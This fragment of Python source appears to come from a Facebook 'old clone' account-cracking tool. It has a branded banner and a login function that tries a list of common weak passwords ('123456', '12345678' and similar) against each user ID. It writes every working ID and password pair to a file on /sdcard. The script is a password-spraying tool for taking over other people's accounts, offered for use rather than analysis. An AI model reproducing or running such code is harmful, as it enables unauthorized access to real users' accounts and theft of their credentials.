...
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{A} NIRAJAN BIST
{G1}[{A}≈{G1}]{G1} TOOL TYPE {A}➢{A} OLD CLONE
{G1}[{A}≈{G1}]{G1}  TOOL{A} ➢{A} {G1}{A}FREE
{G1}[{A}≈{G1}]{G1} MOJ ° HANA  {A}➢{A} TEXT FOR TOOL
{G1}[{A}≈{G1}]{G1} FACEBOOK  {A}➢{A} Ri CH NET
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r {R}[{W}N3T-XD{R}] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","1234567890","12341234","121212","1234512345"]:
            ...
            if "session_key" in rp:
                print(f"\r\r [FIRE] {uid} :- {pw}")
                open("/sdcard/TAMIM-XD[OK].txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r [ADI-FIRE] {uid} :- {pw}")
                open("/sdcard/TAMIM-XD[OK].txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
